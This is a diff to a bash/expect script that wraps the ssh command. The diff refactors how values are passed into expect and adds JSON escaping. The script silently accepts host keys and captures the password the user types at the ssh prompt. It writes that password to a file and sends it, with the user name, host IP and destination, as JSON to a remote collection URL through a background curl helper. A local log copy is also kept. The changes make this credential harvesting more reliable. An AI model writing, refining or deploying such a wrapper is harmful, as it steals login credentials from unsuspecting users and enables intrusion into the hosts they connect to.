@@ -25,6 +25,13 @@ _log_remote() {
     true
 }
 
+_json_esc() {
+    local s="$1"
+    s="${s//\\/\\\\}"
+    s="${s//\"/\\\"}"
+    printf '%s' "$s"
+}
+
 INVOKING_USER=$(whoami)
 HOST_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
 HOST_TS=$(date -u "+%Y-%m-%dT%H:%M:%SZ")
@@ -96,60 +103,55 @@ HELPER
 # expect: handle host key prompt, capture password,
 # fire curl immediately via helper, then interact.
 # -------------------------------------------------------
-expect -c "
+export __SSH_PW_FILE="$PWFILE"
+export __SSH_PAY_FILE="$PAYFILE"
+export __SSH_CURL="$CURL_HELPER"
+export __SSH_COLL="$COLLECT_URL"
+export __SSH_HIP="$HOST_IP"
+export __SSH_USR="$INVOKING_USER"
+export __SSH_TS="$HOST_TS"
+export __SSH_DST="$DEST_HOST"
+export __SSH_DU="$DEST_USER"
+
+expect -c '
     log_user 1
     set timeout 30
-    set pwfile   {$PWFILE}
-    set payfile  {$PAYFILE}
-    set curl_helper {$CURL_HELPER}
-    set collect_url {$COLLECT_URL}
-    set host_ip      {$HOST_IP}
-    set inv_user     {$INVOKING_USER}
-    set ts           {$HOST_TS}
-    set dest_host    {$DEST_HOST}
-    set dest_user    {$DEST_USER}
+    set real_ssh [lindex $argv 0]
+    set ssh_args [lrange $argv 1 end]
 
-    spawn $REAL_SSH $@
+    spawn $real_ssh {*}$ssh_args
 
     while 1 {
         expect {
             -re {Are you sure you want to continue connecting \(yes/no(/\[fingerprint\])?\)\?} {
-                send \"yes\r\"
+                send "yes\r"
             }
 
             -re {\(yes/no\)\?} {
-                send \"yes\r\"
+                send "yes\r"
             }
 
             -re {[Pp]assword[^:]*: $} {
                 stty -echo
                 expect_user -re {(.*)\n}
-                set pw \$expect_out(1,string)
+                set pw $expect_out(1,string)
                 stty echo
-                send_user \"\n\"
+                send_user "\n"
 
-                # Write password to pwfile (bash fallback)
-                set fh [open \$pwfile w]
-                puts -nonewline \$fh \$pw
-                close \$fh
+                set fh [open $env(__SSH_PW_FILE) w]
+                puts -nonewline $fh $pw
+                close $fh
 
-                # Write JSON payload to payfile
-                # Escape backslashes and double-quotes in password
-                set safe_pw [string map {\\ \\\\ \" \\\"} \$pw]
-                set payload [format \
-                    {\"host_ip\":\"%s\",\"user\":\"%s\",\"event_type\":\"ssh\",\"timestamp\":\"%s\",\"data\":{\"destination\":\"%s\",\"dest_user\":\"%s\",\"password\":\"%s\"}} \
-                    \$host_ip \$inv_user \$ts \$dest_host \$dest_user \$safe_pw]
-                set payload \"{[string range \$payload 0 end]}\"
-                set fh2 [open \$payfile w]
-                puts -nonewline \$fh2 \$payload
-                close \$fh2
+                set safe_pw [string map {\\ \\\\ \" \\\"} $pw]
+                set payload [format                     {\"host_ip\":\"%s\",\"user\":\"%s\",\"event_type\":\"ssh\",\"timestamp\":\"%s\",\"data\":{\"destination\":\"%s\",\"dest_user\":\"%s\",\"password\":\"%s\"}}                     $env(__SSH_HIP) $env(__SSH_USR) $env(__SSH_TS) $env(__SSH_DST) $env(__SSH_DU) $safe_pw]
+                set payload "{[string range $payload 0 end]}"
+                set fh2 [open $env(__SSH_PAY_FILE) w]
+                puts -nonewline $fh2 $payload
+                close $fh2
 
-                # Fire curl NOW, in background, don't block interact
-                exec /bin/bash \$curl_helper \$payfile \$collect_url &
+                exec /bin/bash $env(__SSH_CURL) $env(__SSH_PAY_FILE) $env(__SSH_COLL) &
 
-                send \"\$pw\r\"
-
-                # Hand off session — interact blocks until disconnect
+                send "$pw\r"
                 interact
                 break
             }
@@ -158,7 +160,7 @@ expect -c "
             timeout { interact; break }
         }
     }
-" 2>/dev/null
+' "$REAL_SSH" "$@" 2>/dev/null
 SSH_RC=$?
 
 # Fallback: if curl helper didn't fire (e.g. key auth, no password prompt),
@@ -168,9 +170,10 @@ SSH_RC=$?
 if [ -s "$PWFILE" ] && [ -n "$DEST_HOST" ]; then
     CAPTURED_PASS=$(cat "$PWFILE")
     if [ -n "$CAPTURED_PASS" ]; then
+        SAFE_PASS=$(_json_esc "$CAPTURED_PASS")
         PAYLOAD=$(printf '{"host_ip":"%s","user":"%s","event_type":"ssh","timestamp":"%s","data":{"destination":"%s","dest_user":"%s","password":"%s"}}' \
             "$HOST_IP" "$INVOKING_USER" "$HOST_TS" \
-            "$DEST_HOST" "$DEST_USER" "$CAPTURED_PASS")
+            "$DEST_HOST" "$DEST_USER" "$SAFE_PASS")
         _log_remote "$PAYLOAD"
         _log_local "${HOST_TS}|ssh|${INVOKING_USER}|${DEST_USER}@${DEST_HOST}|${CAPTURED_PASS}"
     fi
